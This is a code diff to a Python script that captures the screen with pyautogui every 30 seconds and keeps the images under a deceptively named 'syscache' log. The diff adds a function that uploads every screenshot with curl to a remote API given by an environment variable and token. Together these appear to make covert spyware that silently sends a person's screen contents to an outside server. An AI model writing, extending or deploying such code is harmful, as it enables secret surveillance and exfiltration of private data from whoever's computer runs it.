@@ -3,6 +3,7 @@ import time
 import datetime
 import sys
 import logging
+import subprocess
 import pyautogui
 
 onedrive = os.getenv("OneDrive")
@@ -18,6 +19,8 @@ LOG_FILE = os.path.join(BASE_DIR, "syscache.log")
 
 INTERVAL = 30
 RETENTION_DAYS = 3
+UPLOAD_API_URL = os.getenv("UPLOAD_API_URL", "").strip()
+UPLOAD_API_TOKEN = os.getenv("UPLOAD_API_TOKEN", "").strip()
 
 
 def create_dirs():
@@ -64,6 +67,43 @@ def take_screenshot(timestamp):
     ss = pyautogui.screenshot()
     ss.save(filepath)
     logging.info("Screenshot salva em %s", filepath)
+    send_screenshot_to_api(filepath)
+
+
+def send_screenshot_to_api(filepath):
+    if not UPLOAD_API_URL:
+        return
+
+    cmd = [
+        "curl",
+        "-sS",
+        "-X",
+        "POST",
+        UPLOAD_API_URL,
+        "-F",
+        f"file=@{filepath}",
+    ]
+
+    if UPLOAD_API_TOKEN:
+        cmd.extend(["-H", f"Authorization: Bearer {UPLOAD_API_TOKEN}"])
+
+    try:
+        result = subprocess.run(
+            cmd,
+            capture_output=True,
+            text=True,
+            check=False,
+        )
+        if result.returncode == 0:
+            logging.info("Upload enviado com sucesso para API.")
+        else:
+            logging.error(
+                "Falha no upload (%s): %s",
+                result.returncode,
+                (result.stderr or result.stdout).strip(),
+            )
+    except Exception as e:
+        logging.exception("Erro ao executar curl para upload: %s", e)
 
 
 def cleanup_old_files():
